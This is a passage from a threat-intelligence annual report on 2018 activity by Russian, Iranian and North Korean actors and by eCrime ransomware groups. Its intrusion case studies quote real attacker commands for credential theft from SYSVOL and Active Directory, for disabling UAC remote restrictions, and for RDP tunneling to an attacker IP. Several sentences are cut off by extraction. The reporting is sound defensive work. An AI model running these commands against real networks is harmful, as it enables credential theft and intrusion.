by CrowdStrike Intelligence and known publicly as “Gameredon,” this
operation makes use of malware called Pteranodon, a new version of
which was observed in November 2018. Ukraine’s SBU has stated that
SpiceyHoney is a joint operation between Russia’s Federal Security Service
(FSB) signals intelligence (SIGINT) unit, Center 16, and the Center for
Information Security (ISC), also known as Center 18; however, CrowdStrike

EVOLUTION OF VOODOO BEAR

In February 2018, CrowdStrike reported on a newly identified malware
family dubbed OlympicDestroyer, a destructive tool used against entities
involved in organizing the Olympic Winter Games in PyeongChang. This
malware shared technical and operational links with a series of attacks in
2017 against Ukrainian entities that leveraged ransomware and pseudoransomware as an operational cover for destructive purposes. These
2017 attacks include use of XDATA, NotPetya, and BadRabbit. Further
TTP overlaps between these 2017 operations and previous destructive
campaigns — specifically the use of the KillDisk wiper in December 2016 —
have linked all of these campaigns to the Russia-based adversary VOODOO
BEAR with medium-high confidence.
Unlike previous activity, which used crimeware as a disguise, VOODOO
BEAR’s OlympicDestroyer malware featured an apparent attempt to
adopt some TTPs used by DPRK-associated actors. For example, many
STARDUST CHOLLIMA tools are built using an older version of Microsoft
Visual Studio (MSVS 6), which was also used to build OlympicDestroyer.
This technique demonstrates an evolution in the use of attribution fronts to
include a “false flag” style of operation, in which the adversary attempts to
attach blame for an attack to a third party.

OVERWATCH
INTRUSION
REPORT
Suspected BEAR:
Several Credential Theft Techniques
Employed in Single Intrusion
OverWatch analyzed an intrusion by a suspected BEAR adversary targeting
a policy research organization. The attacker gained initial access to a
domain controller using valid credentials over a Remote Desktop Protocol
(RDP) session. The malicious activity included lateral movement attempts
to reach other systems over RDP and SMB shares, as well as searches for
data specific to the types of research performed by various staff within the
organization.
Throughout the attack, the operator placed a high priority on stealing more
credentials, employing several techniques to do so, specifically:
Credentials in files
Credential dumping
Kerberoasting

Credentials in Files
The actor employed the “credentials in files” technique by using xcopy to
gather Group Policy Preference (GPP) files from the domain controller’s
SYSVOL folder with the following command:
xcopy /S /E /C /Q /H \\[REDACTED]\sysvol\[REDACTED]\
policies\*.*

The purpose of copying GPP files is so they can be mined for credentials
and other information, facilitating a deeper foothold in the network.

REPORT
Credential Dumping
The adversary returned later to perform credential dumping by deploying
and executing the legitimate Windows Sysinternals tool AD Explorer with the
following command:
adexplorer -snapshot "" c:\users\[REDACTED]\downloads\
adexplorer\\snapshot1.snp

This AD Explorer utility provides the ability to save snapshots of the Active
Directory database for offline viewing. Later, the actor accessed a SQL server
over RDP using valid credentials and deployed the ProcDump utility to dump
memory from the LSASS process, providing the attacker with additional
credentials. OverWatch also found that the adversary connected to a third
host over a network logon session and attempted to harvest the Ntds.dit
file and SYSTEM registry archive from a Volume Shadow Copy. The system
registry archive contains the key required to decrypt the Ntds.dit file, as well
as other sensitive information.
Kerberoasting
The CrowdStrike Falcon endpoint protection platform also captured the
malicious operator downloading and running the legitimate Windows Setspn
tool, which searches for service principal names (SPNs) over the network’s
domain. This information was used in an attempt to compromise credentials
via Kerberoasting. Kerberoasting occurs when an attacker, using a valid
Kerberos ticket-granting ticket, requests one or more ticket-granting service
tickets for SPNs from the domain controller. These tickets may be vulnerable
to offline brute-force attacks that can expose plaintext credentials. In this
case, OverWatch also identified the adversary retrieving and executing a
PowerShell script that employed PowerSploit’s Invoke-Kerberoast module,
which requests service tickets and returns crackable ticket hashes.
While the Falcon OverWatch team commonly sees attempts to harvest
credentials during targeted intrusions, this case was unique in the high
number of techniques observed. The attackers clearly placed credential theft
as a top priority for their operation, likely with the intention of maintaining
access to a network they consider a high-value target.

Despite some short-term gaps in attributable incidents this year, Iranbased malicious cyber activity appeared to be fairly constant in 2018 —
particularly involving incidents targeting other countries in the MENA region.
Additionally, the December 2018 re-emergence of the Shamoon wiper
shows significant TTP overlap with previously observed Iran-based activity,
suggesting that Iran continues to be a destructive threat — not only within
the Middle East, but also to companies based in Western countries that may
do business or maintain infrastructure in the region. Newly observed efforts
— including long-running strategic web compromise (SWC) campaigns,
mobile malware and publicly disclosed information operations on Western
social media platforms — demonstrate that Iranian adversaries are adopting
new TTPs. These tactics are being used to conduct cyber espionage
campaigns against regional rivals, control dissident activity, and further “soft
war” campaigns internationally.
On May 8, 2018, the U.S. government withdrew from the Joint
Comprehensive Plan of Action (JCPOA) and re-imposed sanctions that
had been previously lifted under the agreement. CrowdStrike detected no
apparent retaliatory attacks against the U.S. specifically; however, it remains
unclear whether the return of Shamoon is part of a strategy for responding
to the November 2018 resumption of sanctions targeting Iran’s energy
sector. Earlier in the year, rhetoric and policy decisions by Iranian officials
suggest actions directed at the U.S. may be less overt and more likely
designed to increase “soft power” influence. Iran has also taken defensive
measures to harden domestic networks, promoting a narrative of the
potential risk of cyberattacks launched by the West.

INTRUSION
REPORT
HELIX KITTEN:
Repeatedly Thwarted by Falcon Endpoint
While OverWatch has observed a general increase in Iranian-based
adversary activity in 2018, this is particularly true for the actor tracked by
CrowdStrike Intelligence as HELIX KITTEN. However, HELIX KITTEN’s
operations have been repeatedly thwarted when its intended victims
introduce the Falcon platform into their environments. One such case
took place in the spring of 2018, when a victim in the professional services
industry installed Falcon on a new machine that happened to be infected
with a HELIX KITTEN backdoor. The backdoor was a service running a
custom build of the Plink Secure Shell (SSH) client from the Putty suite,
intended to create a compressed and encrypted SSH tunnel to adversarycontrolled C2 infrastructure. The custom build had the following file details:
FILE: c:\windows\ime\svchost.exe
HASH:
144a160c57c2d429d072046edfdd1b44ff22bcae4f0535732f6c2b19190f2f35

Once the Falcon platform was installed, the agent identified and blocked
the backdoor. The disruption appeared to alert the adversary, who then
accessed the machine the following day via PsExec using valid credentials,
and tried to re-enable the implant. One method they attempted was a rarely
seen technique to bypass user account control (UAC). The adversary ran
the following command to modify the registry, which disables UAC remote
restrictions:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\
Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD
/d 1 /f

If UAC remote restrictions are enabled, they prevent local malicious software
from being executed remotely over a network logon, even when using an
account with administrative rights. The user essentially has no elevation
potential on the remote computer when UAC remote restrictions are active.

ADVERSARY TRADECRAFT AND THE IMPORTANCE OF SPEED

OVERWATCH
INTRUSION
REPORT
However, since the implant was blocked by the Falcon agent rather than
UAC remote restrictions, the implant still would not execute. As a result, the
adversary turned its attention elsewhere.
Later in the year, OverWatch found HELIX KITTEN in the act of targeting a
telecommunications provider when the victim deployed Falcon. Due to the
intrusion predating OverWatch’s visibility in the network, the initial intrusion
vector is unknown. The first sign of malicious activity that OverWatch
quickly identified was the compromise of an IIS web server, along with the
use of Windows Management Instrumentation (WMI) to execute encoded
PowerShell commands to establish another reverse SSH tunnel using Plink.
In this case, however, the Plink SSH tool used was a more common variant,
unlike the custom build seen previously.
As the adversary moved laterally to other hosts using WMI and RDP, it
attempted to dump credentials using renamed versions of ProcDump and
Mimikatz:
FILE: c:\programdata\Minidos.exe
HASH: 16f413862efda3aba631d8a7ae2bfff6d84acd9f454a7adaa

NOTE: Variant of Mimikatz

However, Falcon blocked these credential-harvesting tools and forced the
adversary to troubleshoot the problem. The adversary group enumerated
running processes to identify potential security software that might
have been inhibiting its operations. Its subsequent attempts to stop
Falcon endpoint protection were unsuccessful due to the victim properly
configuring Falcon’s hardening features.

Neither public disclosure of DPRK-based adversary activity, nor the multiple
diplomatic overtures between the DPRK and several countries — including
the U.S., China, Russia and South Korea — appear to have decreased the
pace of DPRK malicious cyber activity. In some cases, diplomatic activity
appeared to motivate an increase in DPRK operations. For example,
preceding the historic summit between U.S. President Donald Trump and
DPRK leader Kim Jong-Un, CrowdStrike Intelligence observed an overall

on the Korean peninsula, including SILENT CHOLLIMA, LABYRINTH
CHOLLIMA and VELVET CHOLLIMA.
In 2018, DPRK-based malicious cyber activity supported two primary

of the financial sector, largely perpetrated by LABYRINTH CHOLLIMA
and STARDUST CHOLLIMA, has been linked to currency generation and
economy-bolstering efforts for the Kim regime. On the other hand, the longrunning campaigns of VELVET CHOLLIMA and RICOCHET CHOLLIMA
appear to be focused on acquiring information regarding Korea-related
diplomatic concerns, U.S. and South Korean policy decisions, and analysis
on the denuclearization of the Korean peninsula.

including Mexico, Costa Rica, Chile and Argentina. STARDUST CHOLLIMA
has also been associated with attacks against financial institutions in Asia
and Africa in 2018, reported under the “FASTCash” campaign. This operation
was carried out in two stages: withdrawals from ATMs located in over 20
countries using fraudulent bank debit cards, followed by unauthorized
electronic transactions via the SWIFT global payments network.
The continued targeting of the financial sector by DPRK actors is assessed
to align with the DPRK’s recent national policy shift from “Byungjin” —
the dual track policy aimed at nuclearization and economic growth — to
“Economy First” in early 2018. Large-scale currency-generation efforts likely
serve not only to counter heavy economic sanctions, but also as a method
to support the regime’s future goals in reforming the country’s economic
landscape. During this shift, DPRK officials highlighted that the nuclear tract
of Byungjin had largely been fulfilled and that the DPRK would now focus on
economic reform and growth. With continued economic sanctions imposed
against the DPRK, the need for incoming currency to fulfil these economic
reform plans are only likely to increase. Previous cyber-enabled criminal
operations by the DPRK aimed at currency generation have likely been
viewed as successful by the regime and, as such, will likely continue to be a
priority in DPRK cyber operations in the near future.

STARDUST CHOLLIMA:
One of the Many Threats Facing
the Financial Industry
In 2018, OverWatch noted continued malicious activity against several victims
in the financial sector. Throughout the year, OverWatch uncovered intrusions
against financial industry customers across all major global regions. A recent
example was an attack targeting a financial institution in Latin America and
attributed to DPRK actor STARDUST CHOLLIMA. When OverWatch analyzed the
incident, the adversary had already attained deep access inside the network and
was using valid credentials to remain entrenched.
Over the course of a week, the threat actor used an established beachhead
within the network to move laterally, using scheduled tasks and WMI to create
PowerShell reverse-shells and RDP tunnels. These tunnels provided access to
specific hosts further inside the network. The PowerShell reverse-shells were
unique, fully functioning RATs.
One of the first hosts OverWatch observed the adversary access from its
beachhead was the network’s domain controller. The valid accounts used during
this activity belonged to network administrators, reflecting the high level of
privilege the actor had already obtained. While on the domain controller — among
other procedures performed — the operator ran the LDIFDE utility to export
potentially sensitive Active Directory data. OverWatch also saw evidence of the
adversary accessing the LSASS process in an attempt to dump credentials.
Another victim machine was a payment processing system server, indicating a
potential monetary motive behind the intrusion. The operator used its PowerShell
implant to access several documents containing sensitive financial information on
the server

Further investigation determined log.exe was a unique tool used for multiple
purposes, including the creation of network tunnels and execution of a
malicious DLL payload. For execution, log.exe injected an arbitrary portable
executable into the process memory space of the legitimate Windows Explorer
process. It used an RC4 cypher with a key of "Key" to encrypt and decrypt API
and function names. An example of a command the log.exe tool used for
RDP tunneling is provided here, and includes operator infrastructure:
C:\perflogs\log.exe -s 184.95.51[.]167:1443 -d

After responding to stop the breach with OverWatch assistance, the victim’s
incident response efforts ultimately discovered that the initial intrusion vector
was via a publicly exposed, unsecured network monitoring system that was
not equipped with Falcon endpoint protection.

Throughout 2018, CrowdStrike Intelligence observed ongoing changes to the
eCrime ecosystem. The most notable trend within the year was the continued rise of
ransomware operations targeting large organizations (aka “Big Game Hunting”). The
malware distribution threat MUMMY SPIDER solidified new and existing relationships,
adopting a more professional cycle of providing support to their customers. PINCHY
SPIDER, a RaaS (ransomware-as-a-service) operation, also seemed aware of the
need to keep customers satisfied by significantly increasing its development cycle in
the fall of 2018. Law enforcement actions also affected eCrime actors this year, but in
the case of COBALT SPIDER and CARBON SPIDER, these efforts appeared to have
minimal effect on the overall operations of the groups.

BIG GAME HUNTING
“Big Game Hunting” refers to eCrime operations using ransomware to target
large organizations for a high return. Often, these sophisticated campaigns
include well-tested reconnaissance, delivery and lateral-movement TTPs.
The first ransomware to stake a claim as a Big Game Hunting operation was
Samas (aka SamSam), which is developed and operated by BOSS SPIDER.
This adversary group has consistently targeted companies and government
entities for high ransom demands since it was first identified in January 2016
until at least late November 2018. In July 2017, INDRIK SPIDER joined the
movement toward targeted ransomware with the introduction of BitPaymer,
which reaped profits for this adversary throughout 2018. In August 2018, the
ransomware known as Ryuk was first observed and has netted its operators
— now tracked by CrowdStrike Intelligence as GRIM SPIDER — a significant
(and immediate) profit in campaigns targeting large organizations.

NEW TO BIG GAME HUNTING,
GRIM SPIDER MAKES QUICK PROFITS
CrowdStrike has
assessed that GRIM
SPIDER is likely a cell
of the threat group
WIZARD SPIDER, which
operates the TrickBot
banking malware.

GRIM SPIDER is a sophisticated eCrime group that has been operating
Ryuk ransomware since August of 2018. Ryuk is derived from the source
code of Hermes ransomware, but it has been modified to target large
enterprises. Previous use of Hermes by DPRK-based actors in currencygeneration operations have complicated attribution assessments in opensource reporting; however, CrowdStrike Intelligence has assessed with
medium-high confidence that GRIM SPIDER is a criminal actor based
in Russia. Since Ryuk’s appearance in August of 2018, the threat actors
operating it have netted over 695.80 Bitcoin (BTC) across 51 transactions
with a current value of $3,660,859.44 USD.
CrowdStrike Services has conducted multiple incident response
engagements for customers in the healthcare, pharmaceutical, professional
services and defense sectors in which the banking Trojan TrickBot —
developed and operated by WIZARD SPIDER — was identified alongside
Ryuk in the victim environment. The CrowdStrike Intelligence team believes
that the initial compromise of the environments was conducted using
TrickBot, which is typically distributed via spam email but was also observed
being distributed using the Emotet geo-targeting download function. Some
of TrickBot’s modules (such as pwgrab) could aid in recovering the needed
credentials, and the SOCKS module in particular has been observed
tunneling PowerShell Empire traffic to perform reconnaissance and lateral
movement. Based on this analysis, as well as the private nature of WIZARD
SPIDER’s operations, CrowdStrike has assessed that GRIM SPIDER is likely
a cell of the threat group WIZARD SPIDER, which operates the TrickBot
banking malware. This signals a shift in WIZARD SPIDER’s operations, which
previously focused primarily on wire fraud.
In late 2018, Ryuk binaries continued to deviate further from the original
Hermes source code, as GRIM SPIDER often adds and removes
functionality. In November 2018, CrowdStrike Intelligence identified new
functionality added to Ryuk that included an anti-analysis infinite loop; a
ping-like request to an IP address once the encryption process completes;
and the addition of an appended file extension for encrypted files. Of these
three new features, only the file extension is still present in an executable
compiled on Dec. 20, 2018.

INDRIK SPIDER’S MULTIFACETED OPERATIONS
In March 2018, CrowdStrike Intelligence provided support to an active
BitPaymer ransomware victim in the manufacturing sector. Information
obtained during the course of the investigation confirmed that INDRIK
SPIDER used the Dridex loader module to gain an initial foothold on victim
networks. Previous to 2017, Dridex was observed primarily in banking Trojan
operations, confirming initial analysis from late 2017 that this adversary has
expanded the focus of its operations.
Reports of BitPaymer infections, including activity targeting the U.S.
government sector, continued throughout the summer and into the fall of
2018. Although CrowdStrike did not directly observe BitPaymer incidents
during this time, monitoring payments to known INDRIK SPIDER BTC wallets
indicated that campaigns continued. In July 2018, CrowdStrike Intelligence
noticed a change in the ransom amounts demanded by INDRIK SPIDER.
Previously, these averaged between $150,000 and $200,000 USD; however,
among nine observed payments in July, the lowest amount, based on USD
value, was $40,936.62 USD and the highest was $164,115.79 USD. The
fact that these demands fell within a much wider range suggests that the
adversary broadened its target scope to include smaller businesses and
organizations. Based on observed payments made to all identified adversarycontrolled BTC addresses for BitPaymer, INDRIK SPIDER has so far made a
USD total of approximately $1,490,000 (approximately 205 BTC) from this
ransomware.

FUTURE OF BOSS SPIDER IS UNCERTAIN
Throughout 2018, CrowdStrike Intelligence tracked BOSS SPIDER as it
regularly updated Samas ransomware and received payments to known
BTC addresses. In 2018 alone, BOSS SPIDER netted $3,103,767.77 USD
(based on BTC to USD value at time of payment) from 402.78 BTC, making
2018 its most profitable year to date, based on USD return.

Based on identified Samas samples, CrowdStrike Intelligence assessed that
BOSS SPIDER was likely operating campaign cycles every three to four
weeks, which could suggest the length of time it takes the actor to breach
the victim organization and perform the required reconnaissance. This
consistent pace of activity came to an abrupt halt at the end of November
2018 when the U.S. DoJ released an indictment for Iran-based individuals
Faramarz Shahi Savandi and Mohammad Mehdi Shah Mansouri, alleged
members of the group.
Following the release of this indictment, CrowdStrike observed no interaction
between BOSS SPIDER and victims. The last observed payment by a victim
of Samas ransomware was for 0.081216 BTC (or $343.46 USD) on Dec.
1, 2018. This payment was made to re-enable the expired payment portal
associated with the victim — who was likely compromised on Nov. 17, 2018.
CrowdStrike Intelligence has identified with medium confidence that the last
Samas campaign launched by BOSS SPIDER was on Nov. 25, 2018. Artifacts
from campaigns around this time frame confirm that BOSS SPIDER had
recently updated its pricing due to the drop in the value of BTC.
The future of this group going into 2019 remains uncertain. Although there is
no extradition treaty between Iran and the U.S., the indictment also refers to
two individuals involved in the cashout of ransom payments made to BOSS
SPIDER BTC wallets. The identification of these individuals has possibly
affected the monetization of BOSS SPIDER’s operations.

ECRIME ECOSYSTEM
Throughout 2018, CrowdStrike Intelligence has observed increased
collaborations between highly sophisticated criminal actors. Notably,
MUMMY SPIDER has expanded its relationships to support other
established eCrime adversaries such as WIZARD SPIDER (operators of
TrickBot) and LUNAR SPIDER (operators of BokBot), as well as individual
affiliates making use of banking Trojan malware such as GootKit, Nymaim,
Gozi ISFB, and earlier in 2018, Panda Zeus. Adversaries compromising
PoS devices, TINY SPIDER and SKELETON SPIDER, were both linked to
previous Dridex infections, suggesting that these actors are possibly buying
access acquired by INDRIK SPIDER. Overlaps between TrickBot and Ryuk
established a connection between WIZARD SPIDER and GRIM SPIDER.

MUMMY SPIDER USES GEO-TARGETING TO SUPPORT
MULTIPLE ECRIME FAMILIES
Throughout 2018, CrowdStrike Intelligence observed evidence that MUMMY
SPIDER both expanded its customer base and continued to actively develop
Emotet, making efforts to render the malware more resilient (and thus more
attractive to potential customers). This activity is in line with the adversary’s
shift in 2017 from a banking Trojan operation to a crimeware downloader
service. Prior to this change, when Emotet was still a banking Trojan,
MUMMY SPIDER likely operated the botnet for its own criminal operations,
but this change suggests that Emotet was not proving profitable as a
banking Trojan.
MUMMY SPIDER conducts regular waves of spam campaigns to spread
Emotet — these campaigns often use general invoicing and payroll themes.
Following infection, Emotet uses geo-targeting to determine which payload
to deliver to the victim machine. Over the course of the summer, in addition
to supporting the download of TinyLoader, TrickBot and Panda Zeus,
CrowdStrike Intelligence observed Emotet infections propagating MUMMY
SPIDER’s own SMB Spreader to machines in the U.S., Canada, Germany,
U.K., Japan and Australia. MUMMY SPIDER continued supporting WIZARD
SPIDER through the latter half of the year, while adding geo-targeting
distribution for BokBot (LUNAR SPIDER) and Gozi ISFB. CrowdStrike
Intelligence also observed INDRIK SPIDER continue its historic relationship
with MUMMY SPIDER during 2018, although downloads of Dridex by Emotet
remain rare.

OVERWATCH
INTRUSION
REPORT
MUMMY SPIDER: Unprecedented
Volume in Massive Emotet Campaign
In November 2018, OverWatch identified a significant phishing campaign that
impacted more than 270 CrowdStrike customers. Based on the sheer volume
of victims, this turned out to be the largest Emotet campaign OverWatch has
observed in at least a year. CrowdStrike Intelligence attributed this activity, with
high confidence, to the eCrime actor MUMMY SPIDER.
The phishing campaign consisted of a malicious macro-enabled Microsoft Word
document sent as an email attachment. When recipients opened the weaponized
document and enabled macros, an obfuscated PowerShell command was
launched. OverWatch identified dozens of variants of this obfuscated PowerShell
execution, which then proceeded to contact remote C2 infrastructure to retrieve
and install an Emotet dropper. In each case, the Emotet dropper was written with
a file name of three random digits (i.e., 123.exe). The dropper downloaded the
Emotet malware as the first-stage implant.
Once infected, the host attempted to communicate to known Emotet C2
infrastructure and created persistence on the infected host. Successful C2
contact led to the download of additional malware based on the geographic
location of the infected system.
The observed second-stage malware download illustrated the continued
collaboration between eCrime actor groups. One of the second-stage
downloads, TrickBot, is attributed to the eCrime actor WIZARD SPIDER. The
other second-stage download, BokBot, is attributed to the eCrime actor LUNAR
SPIDER. CrowdStrike Intelligence assesses that these groups that manage
second-stage payloads actively cooperate with MUMMY SPIDER to receive
access to Emotet’s victims.
The Falcon platform protects customers in multiple ways from the malware
threats involved in these campaigns. For example, the PowerShell command
launched from the malicious Microsoft Word document attached to the phishing
email is blocked when preventions are enabled via the Falcon UI. Also, with
preventions enabled, the Falcon platform is capable of preventing both Emotet
and TrickBot. In addition, Falcon OverWatch customers are alerted to the
malicious activity as OverWatch actively hunts in their network environments for
these and other threats, providing world-class expertise to significantly bolster
customers’ defensive measures.

PINCHY SPIDER: A RaaS MODEL OPERATION
First observed in January 2018, GandCrab ransomware quickly began
to proliferate and receive regular updates from its developer, PINCHY
SPIDER, which over the course of the year established a RaaS operation
with a dedicated set of affiliates. Up until the release of GandCrab major
version 4 in July 2018, PINCHY SPIDER appeared to have a slow release
rate. However, after July, the actor increased the pace, releasing a new
minor version every two to three weeks. This acceleration in the pace
of development appeared to be a response to actions taken by security
vendors and the release of decryptors.
This development cycle was then paused in late October 2018, following
the release of version 5.0.5. PINCHY SPIDER suspended advertisements
for the ransomware, while the adversary worked on a major redevelopment
of the ransomware. Specifically, the adversary stated that it will move from
using an RSA key consisting of 2,048 bits to one with 8,192 bits. The threat
actors have also claimed to be working on creating a new admin panel, an
auto-launching feature for MimiKatz, and local privilege escalation (LPE) for
Windows 10 and Windows Servers 2016 and 2019 (specifically leveraging
CVE-2018-8406 and CVE-2018-8405). Notably, in the same forum post,
PINCHY SPIDER encouraged its customers to begin targeting larger
corporate entities to increase their criminal revenue, which could suggest
PINCHY SPIDER has set its sights on a Big Game Hunting RaaS enterprise.
The developer’s release of version 5.1 in December 2018 fell far short
of these goals, and it was not until the last day of the year that PINCHY
SPIDER informed customers that it planned to deliver additional upgrades
to the malware after the new year. At that time, affiliates predominantly used
version 5.0.4, likely because this was viewed as the most stable version.

THE FALL OF GURU SPIDER
AND THE IMPORTANCE OF REPUTATION
Early in 2018, CrowdStrike Intelligence observed GURU SPIDER supporting
the distribution of multiple crimeware families through its flagship malware
loader, Quant Loader. However, in mid-May 2018, a key vendor for GURU
SPIDER was banned from at least one underground forum. The ban was
associated with multiple complaints about the group’s recently released
RAT, dubbed mi.NEXT. According to individuals who purchased the nearly
$1,000 USD product, it failed to meet the advertised capabilities. Ill will
toward the actor was compounded by reports that the seller refused to
issue refunds for the allegedly faulty tool. By the end of June 2018, this
vendor was banned from other criminal forums as well.
Prior to this setback, GURU SPIDER had a strong following for many of its
tools, which included the Madness PRO DDoS botnet, z*Stealer, MKL Pro
Keylogger and MBS BTC Stealer, in addition to Quant Loader. However,
by the end of the year, customer support waned. CrowdStrike Intelligence
no longer observes the use of Quant Loader to facilitate crimeware
downloads, suggesting customers have acquired other means to support
the distribution of their criminal campaigns. The fall of GURU SPIDER
underscores the importance of an adversary’s reputation among other
criminal actors. The marketing of malware relies on positive reviews and a
history of good standing in the underground communities in which these
actors participate.

MINEWARE
AND CRYPTOCURRENCY TRENDS
CrowdStrike Intelligence has continued to track the effect of fluctuations in
the value of cryptocurrencies on eCrime operations. Following a precipitous
rise in the value of BTC at the end of 2017, established eCrime adversaries
continued to further their efforts to acquire BTC, usually by developing
and/or incorporating capabilities to target users’ cryptocurrency wallets.
Ransomware operators are also sensitive to the value of cryptocurrencies,
as many ransom payments are requested in BTC. In November 2018,
immediately following a decline in the USD value of BTC, CrowdStrike
Intelligence observed ransomware operators adjust the cost of decrypting
per-machine in line with the value of BTC.
Mineware (aka cryptojacking), which emerged in full strength during 2017
and continued to proliferate in 2018, has gone from a trending threat
to a pervasive one. Mineware tends to focus on mining Monero (XMR)
cryptocurrency, as it has proven to be the most amenable to CPU mining.
In standalone binary form, mineware is often discovered in conjunction with
other malware on a victim’s network; the presence of it may be indicative of
larger network security problems.

SALTY SPIDER TARGETS CRYPTOCURRENCY WALLETS
Beginning in January 2018 and persisting through the first half of the year,
CrowdStrike Intelligence observed SALTY SPIDER, developer and operator
of the long-running Sality botnet, distribute malware designed to target
cryptocurrency users. These tools, like other secondary payloads delivered
by Sality, have similarities to the Sality malware that indicate they were
also developed by SALTY SPIDER. An early tool scans victim machines
for the presence of directories associated with Electrum BTC wallets and
exfiltrates all files in these directories. Another tool queries the clipboard of
the targeted machine for strings that match the format of BTC addresses.
When this activity was first observed, it came on the heels of a significant
increase in the value of BTC.

THE PERVASIVENESS OF MINEWARE
The prevalence
of mineware in
conjunction with other
criminal computer
compromises has
led law enforcement
agencies to respond to
this threat.

The criminal use of mineware has become associated with the delivery of
binaries, installed via exploitation. In early 2018, the delivery of mineware
was combined with other notable TTPs, including supply chain attacks,
mobile malware and domain-generation algorithms (DGAs). As the year
continued, mineware operators adopted new vulnerabilities, particularly
those affecting Drupal, an open-source content management system. The
compromise of a large number of vulnerable servers enabled these actors
to run mineware surreptitiously and on a large scale.
The prevalence of mineware in conjunction with other criminal computer
compromises has led law enforcement agencies to respond to this threat.
Japan, China, and South Korea all arrested individuals allegedly connected
to mineware operations in 2018. The technology sector has also adopted
measures to limit users’ exposure to mineware, such as browser-based
CPU mining like CoinHive. Several web browser ad blockers now blacklist
mineware-related domains. In April 2018, Google announced that Chrome
extensions containing mineware would be banned from the Chrome
Web Store. Two months later, Apple also updated its guidelines for iOS
applications to prevent the inclusion of cryptocurrency mining code.

OVERWATCH
INTRUSION
REPORT
Monetizing with Coin Miners
a Hot Objective in 2018
OverWatch analyzed a number of targeted eCrime intrusions during
the year, in which the adversary gained considerable access. In past
years, these actors likely would have pursued financial or other types of
sensitive data, or even deployed ransomware. However, with the rise in
cryptocurrency values in late 2017 and early 2018, OverWatch observed
a corresponding rise in the popularity of using malicious network access
to deploy cryptocoin miners. One such example happened when an
insurance company suffered a breach and reached out to the Crowdstrike
Services team for help. OverWatch partnered with the Services team to
help stop, investigate and remediate the breach.
The intrusion started as a ransomware attack, but the company did
not have to pay the ransom because it had already prepared adequate
backups. After recovery, the company called in the CrowdStrike Services
team to investigate the initial intrusion vector. In partnership with the
Services investigation, OverWatch then uncovered continued malicious,
interactive activity. OverWatch threat hunting revealed that the actor
had access to the domain controller via RDP using valid credentials, and
was performing various actions to deepen its foothold. Notably, one of
those actions was leveraging PsExec for script execution of a batch file
on 171 hosts. That batch script used PowerShell to download and install
a Monero coin miner, XMRig. As noted in the recently released 2018
CrowdStrike Services Cyber Intrusion Casebook, Falcon was able to
proactively block the cryptomining activity, so no damage was done. By
providing expertise to the customer’s security team, CrowdStrike was
instrumental in completely eradicating the adversary from the environment
in just under six hours. Further information on this attack, including
details on the WMI event subscription technique used for persistence, are
available in the Services Casebook, Case Study #3.

ARREST OF INDIVIDUALS LINKED TO TARGETED ECRIME
In August 2018, the FBI
announced that three
individuals connected
to CARBON SPIDER
were arrested earlier
in the year.

On March 26, 2018, a Europol press release announced the arrest of an
individual purported to be the leader of the group behind the Carbanak
(tracked as part of CARBON SPIDER) and Cobalt Group (likely relating to
COBALT SPIDER) malware attacks. The individual was identified as Denis K,
a 34-year old Ukrainian. He is the alleged author of the Carbanak malware,
which CrowdStrike identifies as Sekur, CARBON SPIDER’s primary implant.
However, CrowdStrike Intelligence has assessed that Denis K likely left
CARBON SPIDER following widespread public reporting of the Russian
bank campaigns in mid-2015 and continued attacks against Russian and
Eastern European financial institutions in separate activity that CrowdStrike
Intelligence has attributed with high confidence to COBALT SPIDER.
This arrest did not appear to have a major impact on COBALT SPIDER
operations, with additional campaigns identified throughout the summer
of 2018. The relatively short downtime in COBALT SPIDER’s operations
suggests that this is a sophisticated eCrime organization with multiple
members. It is also likely that it has developed contingency plans in case of
further law enforcement action.
CARBON SPIDER also experienced the arrests of alleged members of the
group. In August 2018, the FBI announced that three individuals connected
to CARBON SPIDER were arrested earlier in the year. The three individuals,
all Ukrainian nationals, are believed to have held management positions
within the point of sale (POS) subgroup of CARBON SPIDER, which
targeted U.S. hospitality and restaurant sectors throughout 2017 and into
2018. Despite these arrests, CARBON SPIDER continued to operate and
even introduced a new JavaScript RAT, dubbed Harpy.

BUSINESS EMAIL COMPROMISE
Throughout 2018, CrowdStrike observed business email compromise (BEC)
scams affecting organizations across multiple sectors. Sometimes referred
to as CEO fraud, it often involves an actor sending an email from a spoofed
or compromised account to the victim company’s financial institution
requesting a wire transfer. Once the transfer is sent, the payment details are
intercepted by the criminals and changed. In other incidents, actors have
targeted 401(k) accounts of employees or an institution’s payroll system.
This activity affects both the targeted organization and the financial
institutions supporting these victims. CrowdStrike Intelligence can confirm
that successful fraudulent wire transfers have netted thieves millions of
dollars, with some attempted transfers reaching the billion-dollar mark. BEC
campaigns are often initiated with phishing emails and commodity malware
— including HawkEye, Agent Tesla, and NanoCore — in order to compromise
the organization and gather its sensitive information.

BEC fraud is transnational, which poses some significant challenges in
successfully combating this threat. The fraud operations are often driven
by confraternities based in Nigeria, which may target a U.S.-based business
and then move stolen funds to Mexico, Ireland or China. Nigerian law
enforcement in particular is challenged by limited resources, and Nigerian
criminals often operate in groups or cells in countries outside Africa (e.g.,
Europe, Asia, and North America), which requires law enforcement agencies
to partner in takedown operations.

Corporate security staff noticed suspicious activity on the account of

think an employee satisfaction survey had been authorized, so they
went to the survey page to check it out.
Subsequently, a group of users that reported to the executive received
a similar email, which originated from the executive’s email account.
Trusting the credibility of a link sent by one of their executive officers,
many employees complied with the request and visited the page to
take the survey. Employees who had not completed the survey were
sent a reminder from the executive’s account, and more people went to
the page.
The retailer had recently outsourced its payroll functions to a thirdparty payment solutions provider. CrowdStrike noticed that password
resets for the payroll portal were being requested and informed the
company. CrowdStrike caught the fraud just a few days before payroll
was issued, but if it had not been discovered, the loss would have
exceeded $1,000,000 USD.

The executive who was originally phished didn’t enter any credentials
into the page, but that action wasn’t necessary. Simply visiting the
page gave the adversary a chance to grab the hash of the victim’s
credentials by leveraging a web browser vulnerability that allows
a website to request a username and password hash from the
user’s system. The adversary then cracked the hash to get into the
company’s SSO (single sign-on) system and leverage all the privileges
belonging to the executive.

The CrowdStrike Services team believes the adversary explored the
executive’s email in search of anything it could monetize. It found its
opportunity when it happened upon the news that the company was
outsourcing its payroll.
The adversary had requested password resets to the third-party
payment portal for some of the employees, and then intercepted
the reset messages before legitimate account owners could see
them. Once inside the payment portal, the adversary redirected the
employees’ paychecks to an online bank that provides the ability to
send money anywhere in the world from an account via gift cards.
CrowdStrike has observed other BEC cases that involved SSO
credential theft, but those cases involved only an internal portal. This
is the first time the team has seen an adversary bold enough to use a
